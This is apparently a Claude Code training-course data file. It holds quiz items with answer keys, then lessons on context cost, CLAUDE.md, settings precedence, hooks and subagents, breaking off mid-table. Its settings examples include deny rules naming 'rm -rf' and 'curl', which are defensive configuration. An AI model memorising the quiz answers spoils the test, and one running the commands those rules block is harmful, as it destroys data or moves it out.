    "explanation": "`@claude review once` gives one review with no ongoing subscription — precisely the right tool for a long-running PR with frequent pushes. It does not change the repo's global trigger mode (that's a per-repo dropdown setting). Unlike plain `@claude review`, it does not subscribe the PR to future push-triggered reviews. It also doesn't retroactively unsubscribe an already-subscribed PR."
   },
   {
    "id": "stage-7-q10",
    "type": "multiple-choice",
    "prompt": "Your team's Code Review bill is billed to your Anthropic account even though your org uses Bedrock for all other Claude API calls. A finance team member asks why. What is the correct explanation?",
    "options": [
     "Code Review billing is separate: it uses usage credits billed directly on the Anthropic bill even if the org uses Bedrock or Vertex for other API calls.",
     "Code Review cannot be used with Bedrock at all; the separate billing is a sign that the integration is incorrectly configured.",
     "The Bedrock billing for Code Review is delayed by one billing cycle, so the charge appears on Anthropic first and is reconciled later.",
     "Code Review is included in the Team/Enterprise plan fee, so any Anthropic charges are from a different Claude Code feature."
    ],
    "correct": 0,
    "explanation": "The content explicitly states Code Review billing appears on the Anthropic bill regardless of whether the org routes other calls through Bedrock or Vertex. It is a separate usage-credit line item. There is no misconfiguration — this is by design. There is no reconciliation delay described. It is not included in the plan fee; the content notes it does not count against included plan usage, but is billed as usage credits on top."
   },
   {
    "id": "stage-7-q11",
    "type": "multiple-choice",
    "prompt": "A new engineer runs `claude -p 'summarize this repo'` with both `--system-prompt 'You are a helpful assistant.'` and `--append-system-prompt 'Always respond in bullet points.'`. What will happen?",
    "options": [
     "This combination is valid: `--append-system-prompt` layers rules on top of whatever replaces the default, so bullet-point formatting is added to the custom system prompt.",
     "Claude Code will error because `--system-prompt` and `--append-system-prompt` are mutually exclusive flags.",
     "The `--append-system-prompt` is silently ignored because `--system-prompt` replaces the entire system prompt; you cannot append to a replaced prompt.",
     "The default tool guidance and safety instructions are preserved alongside both the custom prompt and the append — `--system-prompt` only replaces the persona section."
    ],
    "correct": 0,
    "explanation": "The content explicitly says `--append-system-prompt` can be combined with either replace flag. When `--system-prompt` replaces the default, `--append-system-prompt` then layers on top of that replacement. They are not mutually exclusive. `--append-system-prompt` is not silently ignored. However, once `--system-prompt` is used, the default tool guidance and safety instructions are dropped (you own safety) — the append adds to the replacement, not to the original defaults."
   },
   {
    "id": "stage-7-q12",
    "type": "multiple-choice",
    "prompt": "When Claude Code's configuration is behaving unexpectedly and you suspect a project-level hook or skill is at fault, which flag should you use first to isolate whether user/project customizations are the cause — without losing managed policy enforcement?",
    "options": [
     "`--safe-mode`, which disables all customizations while keeping auth, model, built-in tools, permissions, and managed policy normal.",
     "`--bare`, which skips all customization loading including managed policy, giving a minimal baseline.",
     "`--permission-mode default`, which resets to default permissions and implicitly reverts hook behavior.",
     "`--settings '{}'`, which loads an empty settings object, clearing all user and project configuration."
    ],
    "correct": 0,
    "explanation": "`--safe-mode` is the documented first step for troubleshooting: it disables all customizations while leaving managed policy, auth, model, and built-in tools intact — meaning it isolates user/project customizations specifically. `--bare` skips discovery of hooks/skills/plugins but the content does not state it preserves managed policy; it's not the documented troubleshooting step. `--permission-mode default` resets the permission mode but doesn't affect hooks or skills. `--settings '{}'` overrides only keys you set; an empty object overrides nothing — it doesn't clear user or project config."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of Automation, CI & integrations."
 },
 {
  "id": "stage-8",
  "stage": 8,
  "title": "Optimal use, context & cost",
  "summary": "Optimal use, context & cost: Shared CLAUDE.md, Context as the fundamental constraint, Per-feature precedence and four config levels.",
  "prerequisites": [
   "stage-7"
  ],
  "objectives": [
   "Understand the concepts in Optimal use, context & cost."
  ],
  "definitions": [
   {
    "term": "Shared CLAUDE.md",
    "short": "A committed instruction file that loads into context every request and is shared with the whole team when placed at the repo root."
   },
   {
    "term": "Context as the fundamental constraint",
    "short": "Performance degrades and cost rises as the 200K-token window fills, and much of it is consumed before the first prompt by config that always loads."
   },
   {
    "term": "Per-feature precedence and four config levels",
    "short": "Config exists at user, project, plugin, and managed levels, but each feature type resolves conflicts by its own rule rather than a single uniform hierarchy."
   },
   {
    "term": "Build setup incrementally by trigger",
    "short": "Each kind of recurring friction maps to a specific config artifact, so the team's shared setup grows from observed pain rather than upfront design."
   },
   {
    "term": "Hooks as enforcement vs advisory instructions",
    "short": "CLAUDE.md is a request Claude may ignore, while hooks run deterministically at lifecycle events for anything that must happen every time."
   },
   {
    "term": "Context cost varies by feature",
    "short": "Different config features charge context differently (full content, descriptions only, deferred schemas, or zero), which determines what to load eagerly versus on demand."
   }
  ],
  "sections": [
   {
    "heading": "Context is the Fundamental Constraint",
    "body": "Every design decision in this stage reduces to one insight: the 200,000-token context window is the scarce resource, and most teams do not realize how much of it disappears before they type their first prompt.\n\nThe official context-window visualization at `code.claude.com/docs/en/context-window` shows the startup sequence in token counts from a real session:\n\n| What loads at startup | Approximate tokens | Notes |\n|---|---|---|\n| System prompt (core instructions, tool defs, output style) | ~4,200 | Hidden from terminal; loads first |\n| Auto memory (MEMORY.md, first 200 lines/25 KB) | ~680 | Claude's own session notes |\n| Environment info (cwd, shell, OS, git branch/status) | ~280 | Slightly different each session |\n| MCP tool names (deferred mode, names only) | ~120 | Schemas stay out until used |\n| Skill descriptions (1,536-char cap per skill combined) | ~450 | Full content loads on demand |\n| `~/.claude/CLAUDE.md` (user-level) | ~320 | Every project you touch |\n| Project `CLAUDE.md` | ~1,800 | Recommended target: under 200 lines |\n\nThat is roughly 7,850 tokens consumed before any user prompt arrives. With a realistic project CLAUDE.md that has grown organically past the 200-line recommendation, you are easily at 10–15 K tokens of fixed startup overhead. This matters for two reasons:\n\n**Performance degrades as the window fills.** Every message from that point forward re-sends the entire prior context to the API (the model is stateless; Claude Code reconstructs full context on each turn). File reads, test output, grep results — all pile on top. When the window approaches its limit, auto-compaction triggers. Each compaction costs a one-off summarization call that processes the full conversation.\n\n**Cost scales with context size.** Input tokens at the start of a session hit the full input rate. Only unchanged prefixes benefit from prompt caching (covered in detail below). Everything that loads eagerly and mutates between turns blocks caching.\n\nThe operational conclusion: every kilobyte you add to `CLAUDE.md` or eagerly-loaded MCP schemas is a recurring tax on every turn of every session. Design your shared setup with that tax explicitly in mind."
   },
   {
    "heading": "Shared CLAUDE.md: The Team's Committed Instruction File",
    "body": "A `CLAUDE.md` at your project root is the single most impactful config artifact for a shared codebase. It is committed to version control, loaded automatically into every Claude Code session in that directory, and consumed as a user message appended after the system prompt.\n\n### What it is and what it is not\n\nThe docs are explicit: `CLAUDE.md` content is delivered as a user message after the system prompt, not as part of the system prompt itself. Claude reads it and tries to follow it, but there is no guarantee of strict compliance, especially for vague or conflicting instructions. **CLAUDE.md is advisory. Hooks are enforcement.** If something must happen every time — a linter, a format check, a secret scan — put it in a hook, not CLAUDE.md.\n\n### The four CLAUDE.md locations\n\n| Location | Path (Linux/WSL) | Who sees it | Committed? | Use for |\n|---|---|---|---|---|\n| Managed policy | `/etc/claude-code/CLAUDE.md` | All users on machine | IT-deployed | Org-wide compliance/security reminders |\n| User | `~/.claude/CLAUDE.md` | You, all projects | No | Personal workflow preferences |\n| Project | `./CLAUDE.md` or `./.claude/CLAUDE.md` | Whole team via git | Yes | Build commands, architecture, coding standards |\n| Local | `./CLAUDE.local.md` | You, this project | No (gitignored) | Sandbox URLs, personal test data |\n\nFiles load from broadest to most specific scope: managed policy first, user next, project last. Within each directory, `CLAUDE.local.md` is appended after `CLAUDE.md`. All are concatenated; they do not override each other. The managed policy CLAUDE.md **cannot be excluded** by any individual setting.\n\n### What belongs in the committed project CLAUDE.md\n\n```markdown\n# CLAUDE.md — project root\n\n## Build & Test\n- Install: `npm install`\n- Build: `npm run build` (outputs to `dist/`)\n- Test: `npm test` (jest, --runInBand for CI)\n- Lint: `npm run lint` — run before committing\n- Type check: `npm run typecheck`\n\n## Architecture\n- API handlers: `src/api/handlers/` — one file per resource\n- Shared types: `src/types/` — Pydantic models, TypeScript interfaces\n- Database layer: `src/db/` — use the repo pattern, never raw SQL in handlers\n\n## Standards\n- Every public function needs a docstring explaining *why*, not *what*\n- No hardcoded secrets — use env vars from `.env.example`\n- PRs require passing `npm run check` (build + test + lint + typecheck)\n```\n\nTarget: under 200 lines. The docs state explicitly that longer files consume more context and reduce adherence. This is not a soft suggestion — beyond 200 lines, instruction-following degrades measurably.\n\n### Importing additional files\n\n`@path/to/file` syntax inside CLAUDE.md imports another file and inlines it at session start. Useful for pulling in a `package.json` or a shared conventions doc:\n\n```markdown\nSee @package.json for available npm commands.\n\n## Additional workflows\n@docs/git-workflow.md\n```\n\nCritical caveat: imported files load at session start regardless of whether their content is needed. They do not reduce context cost — they just aid organization. Splitting CLAUDE.md into imports helps maintainability but the imported files still load unconditionally. Path-scoped rules (`.claude/rules/`) are the mechanism for reducing context by loading content only when relevant files are opened.\n\n### What survives compaction\n\nAfter `/compact`, the project-root `CLAUDE.md` is re-read from disk and re-injected. Nested `CLAUDE.md` files in subdirectories are **not** immediately re-injected — they reload next time Claude reads a file in that subdirectory. Any instruction given only in conversation (not in a file) is lossy after compaction. This is one of the most common support issues for teams: instructions that worked during a session disappear after compaction.\n\nRule: if an instruction matters across the whole session and must survive compaction, it goes in `CLAUDE.md`. If it was given only in chat, it does not reliably survive."
   },
   {
    "heading": "Per-Feature Precedence and the Four Config Levels",
    "body": "There is no single uniform hierarchy in Claude Code configuration. Different feature types resolve conflicts by their own rule.\n\n### The four levels\n\n| Level | Settings file | CLAUDE.md | Applies to |\n|---|---|---|---|\n| Managed | `/etc/claude-code/managed-settings.json` (Linux/WSL) | `/etc/claude-code/CLAUDE.md` | All users on machine; IT-deployed |\n| Local | `.claude/settings.local.json` | `./CLAUDE.local.md` | You in this repo; gitignored |\n| Project | `.claude/settings.json` | `./CLAUDE.md` | Team via git |\n| User | `~/.claude/settings.json` | `~/.claude/CLAUDE.md` | You, all projects |\n\nFor scalar settings (`model`, `effortLevel`, `outputStyle`, etc.), precedence from highest to lowest is: **Managed > Command-line args > Local > Project > User**.\n\n### The critical exception: permissions merge, not override\n\nPermission rules (`permissions.allow`, `permissions.deny`) concatenate and deduplicate across all levels rather than overriding. A `deny` rule at any level wins over an `allow` at any other level. The `allowManagedPermissionRulesOnly` setting blocks user/project rules entirely — only managed rules apply.\n\n```json\n// ~/.claude/settings.json (user)\n{ \"permissions\": { \"allow\": [\"Bash(npm run lint)\"] } }\n\n// .claude/settings.json (project)\n{ \"permissions\": { \"allow\": [\"Read(~/.zshrc)\"] } }\n\n// Effective result:\n// allow: [\"Bash(npm run lint)\", \"Read(~/.zshrc)\"]\n// deny: [] (still empty)\n```\n\nThis matters operationally: adding a permission at any level adds it for that session. You cannot remove a user-level allow by setting a project-level allow for something else — only a matching deny at any level removes it.\n\n### Committed vs personal: the decision table\n\n| What | Goes in | Why |\n|---|---|---|\n| Team-shared permission allows (e.g., `Bash(npm run *)`) | `.claude/settings.json` | Everyone needs these; commit to git |\n| Personal tool preferences (e.g., your preferred editor) | `~/.claude/settings.json` | Your preference, not the team's |\n| Personal project overrides (e.g., local dev server URL) | `.claude/settings.local.json` | Auto-gitignored; stays off remote |\n| Org security denies (e.g., `Bash(curl *)`) | Managed settings | Enforced at IT level, cannot be overridden |\n| CLAUDE.md: project standards, build commands, architecture | `./CLAUDE.md` | Committed; whole team gets same instructions |\n| CLAUDE.md: personal workflow notes, sandbox env vars | `./CLAUDE.local.md` | Gitignored; personal and project-scoped |\n| Hooks for team-enforced code quality | `.claude/settings.json` hooks section | Committed; fires for every team member |\n| Hooks for personal convenience (notification sounds, etc.) | `~/.claude/settings.json` hooks section | Personal; does not impose on teammates |\n\n### Settings.json structure reference\n\n```json\n{\n  \"$schema\": \"https://json.schemastore.org/claude-code-settings.json\",\n  \"permissions\": {\n    \"allow\": [\"Bash(npm run *)\", \"Read(~/.zshrc)\"],\n    \"deny\": [\"Bash(rm -rf *)\"],\n    \"ask\": []\n  },\n  \"env\": {\n    \"NODE_ENV\": \"development\"\n  },\n  \"model\": \"claude-sonnet-4-6\",\n  \"effortLevel\": \"medium\",\n  \"hooks\": {},\n  \"autoCompactEnabled\": true,\n  \"claudeMdExcludes\": [\"**/vendor/**/CLAUDE.md\"]\n}\n```\n\n### Hot-reload behavior\n\nSome settings take effect immediately without restarting:\n- **Auto-reloads**: `permissions`, `hooks`, credential helpers (`apiKeyHelper`, `awsAuthRefresh`, `gcpAuthRefresh`). A `ConfigChange` hook fires on each reload.\n- **Requires restart (or `/clear`)**: `model`, `outputStyle` — these are part of the system prompt, which loads once at session start."
   },
   {
    "heading": "Hooks as Enforcement vs CLAUDE.md as Advisory",
    "body": "This is the most consequential distinction in the entire config system. The docs put it plainly:\n\n> If the instruction is something that must run at a specific point — before every commit or after each file edit — write it as a hook instead. Hooks execute as shell commands at fixed lifecycle events and apply regardless of what Claude decides to do.\n\n### What hooks can do that CLAUDE.md cannot\n\n| Requirement | CLAUDE.md | Hook |\n|---|---|---|\n| Run a linter after every file edit | Advisory; Claude may skip | `PostToolUse` on `Edit\\|Write` — deterministic |\n| Block a dangerous command | Claude reads and may comply | `PreToolUse` exit code 2 — hard block |\n| Send a Slack notification on session end | Cannot do | `SessionEnd` command hook |\n| Validate JSON schema before writing a config file | Advisory | `PreToolUse` on `Write` — can block with exit 2 |\n| Preprocess log files before Claude reads them | Cannot do | `PreToolUse` on `Bash` — rewrite the command via `updatedInput` |\n\n### Hook lifecycle events (selected)\n\nHooks fire at fixed points in a session's lifecycle. Events fall into three cadences:\n\n```\n# Once per session\nSessionStart         — fires once at startup\nSessionEnd           — fires on session exit\nSetup                — fires once after SessionStart; good for env setup\n\n# Once per turn\nUserPromptSubmit     — fires when user submits a prompt; can block\nStop                 — fires when Claude finishes a turn; can block\n\n# Every tool call\nPreToolUse           — fires before any tool call; can block (exit 2)\nPostToolUse          — fires after tool call; cannot block (tool already ran)\nPermissionRequest    — fires on permission prompts; can grant or deny\n\n# Other\nPreCompact           — fires before compaction; exit 2 prevents it\nPostCompact          — fires after compaction\nFileChanged          — fires when watched files change\nConfigChange         — fires when settings files change\n```\n\n### Hook configuration format\n\nHooks go in the `hooks` key of any `settings.json`. The structure has three levels: event name → array of matcher objects → array of hook definitions.\n\n```json\n{\n  \"hooks\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Edit|Write\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/prettier.sh\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ],\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"${CLAUDE_PROJECT_DIR}/.claude/hooks/block-dangerous.sh\",\n            \"timeout\": 10\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\nMatcher values: an exact tool name (`Bash`), a pipe-separated list (`Edit|Write`), `\"*\"` to match all, or a JavaScript regex for anything containing other characters (`^mcp__memory__.*`). Events that do not support matchers (e.g., `UserPromptSubmit`, `Stop`) ignore the field.\n\n### Exit code contract\n\n| Exit code | Meaning |\n|---|---|\n| 0 | Success; stdout is parsed for JSON if present |\n| 2 | Blocking error; stderr is shown, hook blocks the action (only for blockable events) |\n| Other (e.g., 1) | Non-blocking error; first line of stderr shown, execution continues |\n\nFor `PostToolUse`, exit code 2 surfaces the error message but **cannot block** — the tool already ran. Use `PreToolUse` for blocking.\n\n### Hook stdout: injecting context or rewriting commands\n\nA hook returns structured JSON on stdout (exit code 0). This is how you send information back to Claude or rewrite a tool call:\n\n```bash\n#!/bin/bash\n# PreToolUse hook that filters test output to failures only\ninput=$(cat)  # full JSON from stdin\ncmd=$(echo \"$input\" | jq -r '.tool_input.command')\n\nif [[ \"$cmd\" =~ ^(npm test|pytest|go test) ]]; then\n  filtered=\"$cmd 2>&1 | grep -A5 -E '(FAIL|ERROR)' | head -50\"\n  # Rewrite the command; Claude sees only failure lines\n  printf '{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"allow\",\"updatedInput\":{\"command\":\"%s\"}}}' \"$filtered\"\nelse\n  echo \"{}\"\nfi\n```\n\nKey output fields:\n- `continue: false` — stop the entire session\n- `systemMessage` — warning shown to the user\n- `additionalContext` — text injected into Claude's conversation\n- `hookSpecificOutput.permissionDecision` — `allow`, `deny`, `ask`, or `defer` (PreToolUse)\n- `hookSpecificOutput.updatedInput` — rewrite the tool's arguments (PreToolUse)\n\nHook stdout is **not** automatically sent to Claude as conversation text. Only `additionalContext` (and `updatedInput` for tool rewrites) reaches Claude. Plain stdout on exit 0 goes to the debug log only.\n\n### Pitfall: hooks in committed settings run for all teammates\n\nA hook in `.claude/settings.json` runs for every team member who clones the repo, including CI. Scripts must be platform-safe, must exist at the referenced path in the repo, and should not assume personal tooling at hardcoded paths. Use `${CLAUDE_PROJECT_DIR}` for all hook script paths, and reference project-installed tools via their project path (e.g., `./node_modules/.bin/prettier`) rather than a global install."
   },
   {
    "heading": "Context Cost Varies by Feature: Eager vs Deferred Loading",
    "body": "Not all config features charge context the same way. Understanding the tiers determines what you include eagerly versus on demand.\n\n### The four context-cost tiers\n\n| Tier | What loads | When | Example |\n|---|---|---|---|\n| Full content, always | CLAUDE.md (all scopes), imported files via `@`, path-matched rules when triggered | Every session / when file matched | Project standards, build commands |\n| Description only (deferred) | MCP tool names (schemas deferred by default), skill descriptions (1,536-char cap combined with `when_to_use`) | Session start; full content loads on use | MCP server list; skill index |\n| Zero until invoked | Skills with `disable-model-invocation: true` | Only when you type `/skill-name` | Side-effect skills: deploy, commit, send-message |\n| Zero (hook metadata not in context) | Hook definitions in settings.json | Not in LLM context; runs out-of-band | Pre-commit checks, notification scripts |\n\n### MCP tool deferral in practice\n\nBy default, MCP tool names are listed at session start (~120 tokens) but full schemas stay deferred. Claude loads a specific schema on demand via tool search when it needs to call that tool. This is controlled via the `ENABLE_TOOL_SEARCH` environment variable:\n\n```bash\n# Default: deferred schemas (names only at startup)\n# ENABLE_TOOL_SEARCH not set\n\n# Load schemas upfront when they fit within 10% of the context window\nexport ENABLE_TOOL_SEARCH=auto\n\n# Load all schemas upfront immediately (high context cost)\nexport ENABLE_TOOL_SEARCH=false\n```\n\nDeferral requires tool search support. It is **not** available on Haiku models, Vertex AI, or with a custom `ANTHROPIC_BASE_URL` gateway. On those paths all tool schemas load into the prefix — and any server connect/disconnect invalidates the entire cache. Keep that in mind when choosing models or providers for cost-sensitive automation.\n\n### Skills: descriptions vs content\n\nSkill descriptions (one combined block for all skills, each description + `when_to_use` truncated at 1,536 characters) load at session start so Claude knows what is available. The full `SKILL.md` body loads only when Claude invokes the skill. From the official invocation/context table:\n\n| Frontmatter | You can invoke | Claude can invoke | When loaded into context |\n|---|---|---|---|\n| (default) | Yes | Yes | Description always in context; full skill loads when invoked |\n| `disable-model-invocation: true` | Yes | No | Description **not** in context; full skill loads only when you invoke |\n| `user-invocable: false` | No | Yes | Description always in context; full skill loads when invoked |\n\nSkills with `disable-model-invocation: true` are the right pattern for any skill with side effects (deploy, send notifications, force-push). They stay completely out of context until you deliberately invoke them.\n\n### Path-scoped rules: conditional loading\n\nRules in `.claude/rules/` with `paths:` frontmatter load only when Claude opens a matching file:\n\n```markdown\n---\npaths:\n  - \"src/api/**/*.ts\"\n---\n\n# API conventions\n- All endpoints must validate input with zod\n- Return `{ error: string, code: string }` on 4xx\n- Use the `withAuth` middleware for authenticated routes\n```\n\nThis rule (~200 tokens) is invisible during frontend work. It enters context only when Claude reads a file matching `src/api/**/*.ts`. Rules without `paths:` frontmatter load at session start unconditionally — same as CLAUDE.md.\n\nThe practical breakdown for a large team's monorepo:\n- Frontend engineers working in `packages/ui/` never pay for backend API conventions\n- Backend engineers working in `src/api/` get those rules automatically when they open a matching file\n- CI running tests only ever loads rules matching `tests/**`\n\n### Skill content after compaction\n\nOnce a skill loads during a session, its content stays in context for the rest of that session. After `/compact`, skills you invoked are re-attached within a combined budget of 25,000 tokens (up to 5,000 tokens per skill kept). Skills are re-attached starting from the most recently invoked; older skills can be dropped entirely if you invoked many in one session. Skill descriptions (the short listing) are **not** re-injected after compaction."
   },
   {
    "heading": "Build Setup Incrementally by Trigger",
    "body": "The anti-pattern is designing a complete Claude Code setup upfront. The correct pattern is growing it from observed friction, because each recurring pain maps to a specific artifact.\n\n### The friction-to-artifact map\n\n| Recurring friction | Artifact to add | Where |\n|---|---|---|\n| Teammates keep asking what the build command is | Build commands in `CLAUDE.md` | `./CLAUDE.md` |\n| Claude forgets the project architecture after a few turns | Architecture section in `CLAUDE.md` | `./CLAUDE.md` |\n| CLAUDE.md is growing past 200 lines | Move procedure sections to skills | `.claude/skills/<name>/SKILL.md` |\n| Linter keeps getting skipped | `PostToolUse` hook running linter on `Edit\\|Write` | `.claude/settings.json` |\n| Claude tries dangerous bash commands | `PreToolUse` hook blocking with exit 2 | `.claude/settings.json` |\n| API-specific conventions only needed for API files | Path-scoped rule in `.claude/rules/api.md` | `.claude/rules/api.md` with `paths: src/api/**` |\n| Teammates keep doing the same multi-step deployment | `deploy` skill with `disable-model-invocation: true` | `.claude/skills/deploy/SKILL.md` |\n| Personal test server URL keeps needing to be typed | Local CLAUDE.md override | `./CLAUDE.local.md` (gitignored) |\n| Team needs MCP tool X but not Y | Commit `.mcp.json` with X; disable Y via `disabledMcpjsonServers` | `.mcp.json` |\n| New teammates always hit the same setup gotcha | `SessionStart` hook running a setup script | `.claude/settings.json` hooks, `SessionStart` event |\n\n### Starting file layout for a new shared repo\n\n```\nyour-repo/\n├── CLAUDE.md                    # Committed: build commands, architecture, standards\n├── CLAUDE.local.md              # Gitignored: personal sandbox config\n├── .mcp.json                    # Committed: shared MCP servers for this project\n└── .claude/\n    ├── settings.json            # Committed: shared permissions, hooks, env vars\n    ├── settings.local.json      # Gitignored (auto): personal overrides\n    ├── agents/\n    │   └── code-reviewer.md     # Committed: shared subagent definitions\n    ├── rules/\n    │   ├── api-conventions.md   # paths: src/api/**\n    │   └── security.md          # no paths: — unconditional review rule\n    └── skills/\n        └── deploy/\n            └── SKILL.md         # disable-model-invocation: true\n```\n\n### The ordering of adoption\n\n1. **First**: committed `CLAUDE.md` with build commands and project layout. This alone eliminates the majority of context-rebuilding queries new teammates ask.\n2. **Second**: `.claude/settings.json` with permission allows for your build system. Without this, every `npm run build` triggers a permission prompt.\n3. **Third**: hooks for non-negotiables. Once two teammates have each had Claude skip the linter, add a `PostToolUse` hook.\n4. **Fourth**: path-scoped rules when CLAUDE.md hits 200 lines. Move subsystem-specific conventions to `.claude/rules/`.\n5. **Fifth**: skills when procedures start appearing in CLAUDE.md. If a section is a checklist rather than a fact, it belongs in a skill.\n6. **Later**: subagent definitions for specialized roles that recur (code reviewer, documentation writer, test generator).\n\n### Common pitfall: premature comprehensiveness\n\nA 600-line CLAUDE.md written on day one is worse than a 50-line one. Context cost scales linearly with length, adherence degrades, and the file becomes unmaintainable. The incremental-by-trigger approach also forces you to distinguish facts (CLAUDE.md) from procedures (skills) from enforcement (hooks) — distinctions that matter for both correctness and cost."
   },
   {
    "heading": "What Survives Compaction: The Durable Config Surface",
    "body": "Auto-compaction is a session event where Claude Code summarizes your entire conversation history and replaces it with a structured summary. Understanding exactly what survives determines what must live in files rather than conversation.\n\n### The compaction survival table\n\n| Content | Survives compaction? | Mechanism |\n|---|---|---|\n| Project-root `CLAUDE.md` | Yes | Re-read from disk and re-injected |\n| `~/.claude/CLAUDE.md` (user-level) | Yes | Re-read from disk and re-injected |\n| Managed policy `CLAUDE.md` | Yes | Re-read from disk and re-injected |\n| Nested `CLAUDE.md` in subdirectories | Not immediately | Re-loaded next time Claude reads a file in that subdirectory |\n| Skill descriptions (startup listing) | No | Not re-injected after compaction |\n| Skills you invoked during session | Partially | Re-attached up to a combined 25,000-token budget (5,000 tokens per skill max), starting from most-recently invoked |\n| Skills with `disable-model-invocation: true` | Not applicable | Were never in context |\n| Conversation-only instructions (typed in chat) | No | Summarized and may be lossy |\n| Path-scoped rules that fired | No (the rule text) | Re-loads when Claude reads matching files again |\n| Auto memory (MEMORY.md, first 200 lines/25 KB) | Yes | Re-read from disk |\n| Hook definitions | Yes | They run out-of-band; not in conversation anyway |\n| Settings (permissions, env vars) | Yes | Live in files; apply every turn |\n\n### The CLAUDE.md mid-session edit gotcha\n\nThe docs confirm: if you edit CLAUDE.md during a session, the change does **not** take effect in the current session. Claude loaded the file at session start and holds it in memory for that session. The edit applies only after `/clear`, `/compact`, or restart.\n\nImportantly, a mid-session CLAUDE.md edit also does **not** invalidate the prompt cache — the cached prefix was built from the version loaded at session start, and since that content in the request does not change, the cache remains valid. This is a feature, not a bug.\n\nThis creates a common failure mode: engineer edits CLAUDE.md to add a rule, continues working in the same session, wonders why Claude ignored it. Fix: always `/compact` or `/clear` after editing CLAUDE.md when you need the new instructions in the current session.\n\n### Customizing compaction behavior\n\nYou can tell Claude what to prioritize during summarization by adding a section to CLAUDE.md:\n\n```markdown\n## Compact instructions\n\nWhen compacting, focus on:\n- Any failing test names and their error messages\n- The specific files modified in this session\n- Any architectural decisions made\n- Current task state (what was done, what remains)\n```\n\nYou can also supply a one-off compaction instruction inline:\n\n```\n/compact Focus on code samples and API usage\n```\n\nThis is the one legitimate place where conversation-aware content in CLAUDE.md improves outcomes — the compaction summary that follows will reflect your prioritization for that session."
   },
   {
    "heading": "Subagent Context Isolation: Keeping Verbose Work Out of the Main Window",
    "body": "When a task requires reading many files, fetching documentation, or processing large command outputs, the naive approach floods the main session's context window with content you will reference once and never need again. Subagents solve this structurally: a subagent runs in its own context window, does its verbose work there, and returns only a summary to the parent.\n\nThe official context window visualization gives a concrete before-and-after: a subagent reads three files totaling 6,100 tokens of content. Only its 420-token summary returns to the main session. That is a 14:1 compression ratio on that work segment.\n\n### What the subagent's context contains\n\nA general-purpose subagent starts its session with:\n- Its own system prompt (shorter than the main session's — just a brief prompt plus environment details)\n- Project `CLAUDE.md` — same file, counts against the **subagent's** context, not yours (exception: the built-in Explore and Plan subagents skip CLAUDE.md to keep their context small)\n- MCP tools and skills (same availability as the parent, minus UI-only tools like `AskUserQuestion`)\n- The task prompt from the parent\n- **Not included**: the parent's conversation history, the parent's auto memory\n\nFrom the parent's perspective, spawning a subagent appends a small spawn message (~80 tokens) and the returned summary to the main context. The subagent's internal file reads, grep results, and exploration never touch the parent's window.\n\n### Configuring subagents for cost control\n\nSubagent files live at `.claude/agents/<name>.md` (project-scoped, committed) or `~/.claude/agents/<name>.md` (personal). The `model` field accepts `sonnet`, `opus`, `haiku`, `fable`, a full model ID, or `inherit` (the default):\n\n```markdown\n---\nname: log-analyzer\ndescription: Analyzes log files for errors and anomalies. Use when asked to investigate logs, find error patterns, or summarize recent failures.\nmodel: haiku\n---\n\nYou are a log analysis specialist. Read the specified log files, extract error patterns, count occurrences, and return a concise summary with: top 5 errors by frequency, any new errors not seen in prior sessions, and recommended investigation targets.\n```\n\nRouting log analysis to Haiku while the main session runs on Sonnet is the primary cost-structure lever for teams doing heavy automation. Each subagent maintains its own token budget independently.\n\n### When to use subagents\n\n| Task | Subagent? | Reason |\n|---|---|---|\n| Read 20 files to answer an architecture question | Yes | 20 file reads stay in subagent's window |\n| Fetch and summarize external documentation | Yes | Fetch output can be 10K+ tokens |\n| Run a single `npm test` and read output | No | Overhead of spawn outweighs savings |\n| Generate a code change in a known file | No | Needs full conversation context |\n| Process CI logs and extract failures | Yes | Logs can be 50K+ tokens; summary is 200 |\n| Investigate an unknown bug across many files | Yes | Exploration output is large and transient |\n\n### Subagent context isolation for prompt caching\n\nA subagent builds its own prompt cache separately from the parent. It starts with zero cache hits and warms its own cache across its own turns. Subagents use the **5-minute cache TTL** even when the parent session is on a Claude subscription that gets the automatic 1-hour TTL. For short-lived subagents doing a one-shot analysis, this means their first turn is uncached — a small fixed cost to budget for in automation pipelines.\n\n### Built-in subagents\n\nClaude Code ships three always-available subagents:\n\n| Built-in agent | Model | Key restriction | Used when |\n|---|---|---|---|\n| Explore | Haiku | Read-only tools | Fast codebase search/analysis |\n| Plan | Inherits | Read-only tools | Plan-mode research before proposing changes |\n| General-purpose | Inherits | All tools | Complex multi-step tasks |\n\nExplore and Plan skip your CLAUDE.md and the parent session's git status to keep their context small and fast."
   },
   {
    "heading": "Model and Effort Selection as the Primary Cost Lever",
    "body": "Once you have a working setup, model and effort selection is where you reclaim the most cost — not by reducing context size (which is bounded by the work), but by paying the right rate per token for each class of task.\n\n### Extended thinking: on by default, billed as output tokens\n\nThe docs are explicit: extended thinking is enabled by default and billed as output tokens. Output token rates are typically higher than input rates. A thinking budget of tens of thousands of tokens per request is normal for complex tasks on Opus. For tasks that do not require multi-step reasoning — code formatting, simple refactors, log parsing — this is pure waste.\n\nControls, in order of reach:\n\n```bash\n# In settings.json — persistent default effort level for the project/user\n{\n  \"effortLevel\": \"low\"\n}\n\n# Per-session — interactive override\n/effort low\n\n# Per-skill — override for a specific operation (in SKILL.md frontmatter)\n---\neffort: low\n---\n\n# For models with a fixed thinking budget\nexport MAX_THINKING_TOKENS=8000\n```\n\nAvailable effort levels: `low`, `medium`, `high`, `xhigh`, `max`. Available levels depend on the model. Adaptive-reasoning models (such as Opus / Fable) ignore `MAX_THINKING_TOKENS` — use effort levels for those. Fixed-thinking-budget models respond to `MAX_THINKING_TOKENS`. Disabling thinking entirely is not available on Fable 5, which always uses extended thinking.\n\n### Changing effort level invalidates the cache\n\nThis is a critical operational constraint: the prompt cache is keyed by both model AND effort level. Changing `/effort` mid-session causes the next turn to pay full input rate for the entire conversation history. Claude Code shows a confirmation dialog before applying an effort change mid-session because of this cost. Set effort at the start of a session and avoid changing it mid-task.\n\n### Model selection per task class\n\n| Task class | Recommended model | Reasoning |\n|---|---|---|\n| Complex architecture, multi-file refactor | Opus | High reasoning quality justifies cost |\n| Most 